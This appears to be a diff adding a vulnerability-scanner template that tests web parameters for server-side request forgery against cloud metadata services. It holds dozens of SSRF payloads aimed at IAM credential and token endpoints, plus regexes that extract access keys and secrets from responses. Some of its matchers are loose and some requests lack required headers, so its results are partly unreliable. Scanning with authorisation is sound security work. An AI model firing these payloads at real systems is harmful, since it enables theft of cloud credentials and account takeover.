@@ -1,0 +1,125 @@
+id: ssrf-cloud-metadata
+
+info:
+  name: SSRF To Cloud Instance Metadata Service
+  author: p3i
+  severity: high
+  description: Tests common URL parameters for Server-Side Request Forgery reaching cloud instance metadata services (AWS IMDSv1, GCP, Azure, DigitalOcean, Oracle Cloud). A successful hit exposes IAM credentials, instance identity, and cloud environment configuration.
+  tags: misconfig,ssrf,cloud,metadata,aws,gcp,azure,imds,web
+  metadata:
+    max-request: 108
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/{{ssrf_path}}"
+
+    payloads:
+      ssrf_path:
+        - "?url=http://169.254.169.254/latest/meta-data/"
+        - "?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        - "?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
+        - "?url=http://metadata.google.internal/computeMetadata/v1/?recursive=true"
+        - "?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+        - "?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+        - "?url=http://169.254.169.254/metadata/v1/id"
+        - "?url=http://192.168.0.1/"
+        - "?target=http://169.254.169.254/latest/meta-data/"
+        - "?target=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        - "?target=http://metadata.google.internal/computeMetadata/v1/?recursive=true"
+        - "?redirect=http://169.254.169.254/latest/meta-data/"
+        - "?redirect=http://metadata.google.internal/computeMetadata/v1/?recursive=true"
+        - "?next=http://169.254.169.254/latest/meta-data/"
+        - "?next=http://metadata.google.internal/computeMetadata/v1/?recursive=true"
+        - "?file=http://169.254.169.254/latest/meta-data/"
+        - "?path=http://169.254.169.254/latest/meta-data/"
+        - "?src=http://169.254.169.254/latest/meta-data/"
+        - "?href=http://169.254.169.254/latest/meta-data/"
+        - "?image=http://169.254.169.254/latest/meta-data/"
+        - "?fetch=http://169.254.169.254/latest/meta-data/"
+        - "?load=http://169.254.169.254/latest/meta-data/"
+        - "?proxy=http://169.254.169.254/latest/meta-data/"
+        - "?proxy=http://metadata.google.internal/computeMetadata/v1/?recursive=true"
+        - "?request=http://169.254.169.254/latest/meta-data/"
+        - "?link=http://169.254.169.254/latest/meta-data/"
+        - "?callback=http://169.254.169.254/latest/meta-data/"
+        - "?endpoint=http://169.254.169.254/latest/meta-data/"
+        - "?endpoint=http://metadata.google.internal/computeMetadata/v1/?recursive=true"
+        - "?api=http://169.254.169.254/latest/meta-data/"
+        - "?server=http://169.254.169.254/latest/meta-data/"
+        - "?host=http://169.254.169.254/latest/meta-data/"
+        - "?webhook=http://169.254.169.254/latest/meta-data/"
+        - "?webhook=http://metadata.google.internal/computeMetadata/v1/?recursive=true"
+        - "?import=http://169.254.169.254/latest/meta-data/"
+        - "?download=http://169.254.169.254/latest/meta-data/"
+        - "?uri=http://169.254.169.254/latest/meta-data/"
+        - "?uri=http://metadata.google.internal/computeMetadata/v1/?recursive=true"
+        - "?resource=http://169.254.169.254/latest/meta-data/"
+        - "?resource=http://metadata.google.internal/computeMetadata/v1/?recursive=true"
+        - "?location=http://169.254.169.254/latest/meta-data/"
+        - "?open=http://169.254.169.254/latest/meta-data/"
+        - "?data=http://169.254.169.254/latest/meta-data/"
+        - "?source=http://169.254.169.254/latest/meta-data/"
+        - "?source=http://metadata.google.internal/computeMetadata/v1/?recursive=true"
+        - "?returnUrl=http://169.254.169.254/latest/meta-data/"
+        - "?return_url=http://169.254.169.254/latest/meta-data/"
+        - "?remote=http://169.254.169.254/latest/meta-data/"
+        - "?site=http://169.254.169.254/latest/meta-data/"
+        - "?domain=http://169.254.169.254/latest/meta-data/"
+        - "?forward=http://169.254.169.254/latest/meta-data/"
+        - "?page=http://169.254.169.254/latest/meta-data/"
+        - "?continue=http://169.254.169.254/latest/meta-data/"
+        - "?destination=http://169.254.169.254/latest/meta-data/"
+
+    attack: batteringram
+    redirects: true
+    max-redirects: 3
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "ami-id"
+          - "ami-launch-index"
+          - "instance-id"
+          - "instance-type"
+          - "local-ipv4"
+          - "placement"
+          - "security-credentials"
+          - "iam/security-credentials"
+          - "AWSAccessKeyId"
+          - "AccessKeyId"
+          - "SecretAccessKey"
+          - "Token"
+          - "Expiration"
+          - "project-id"
+          - "numeric-project-id"
+          - "serviceAccounts"
+          - "computeMetadata"
+          - "\"subscriptionId\""
+          - "\"resourceGroupName\""
+          - "\"vmId\""
+          - "\"location\""
+          - "droplet_id"
+          - "oracle-cloud"
+          - "ocid"
+          - "\"tenancyId\""
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "(?im)(ami-id|instance-id|instance-type|local-ipv4|placement|security-credentials).*"
+          - "(?im)(AccessKeyId|SecretAccessKey|Token|Expiration)\\s*[=:\"]+\\s*[^\\r\\n,\"]{10,}"
+          - "(?im)(serviceAccounts|project-id|numeric-project-id)[^\\r\\n]{0,160}"
+          - "(?im)(subscriptionId|resourceGroupName|vmId|location)[^\\r\\n]{0,160}"
+      - type: dsl
+        name: status
+        dsl:
+          - "status_code"
